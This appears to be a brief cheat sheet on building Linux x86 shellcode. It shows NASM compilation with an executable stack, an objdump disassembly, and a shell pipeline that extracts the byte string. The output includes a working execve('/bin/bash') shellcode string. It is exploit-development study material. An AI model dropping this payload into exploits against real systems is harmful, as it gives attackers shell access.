# Shellcode

## Compile a NASM file 
### Commands
```
nasm -f elf32 -o file.o file.nasm
ld -z execstack -o file file.o
```
## Check if they are some null bytes in the shellcode
### Command
```
objdump -d execve -M intel
```
### Output
```
execve:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:	eb 07                	jmp    8048089 <stage_1>

08048082 <stage_2>:
 8048082:	5b                   	pop    ebx
 8048083:	31 c0                	xor    eax,eax
 8048085:	b0 0b                	mov    al,0xb
 8048087:	cd 80                	int    0x80

08048089 <stage_1>:
 8048089:	e8 f4 ff ff ff       	call   8048082 <stage_2>

0804808e <shell>:
 804808e:	2f                   	das    
 804808f:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
 8048092:	2f                   	das    
 8048093:	62 61 73             	bound  esp,QWORD PTR [ecx+0x73]
 8048096:	68                   	.byte 0x68
```

## Get a shellcode format from the objdump output
### Command
```
objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
### Output
```
"\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\xe8\xf4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
```

## Important resssouces
* [Intel manual](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf)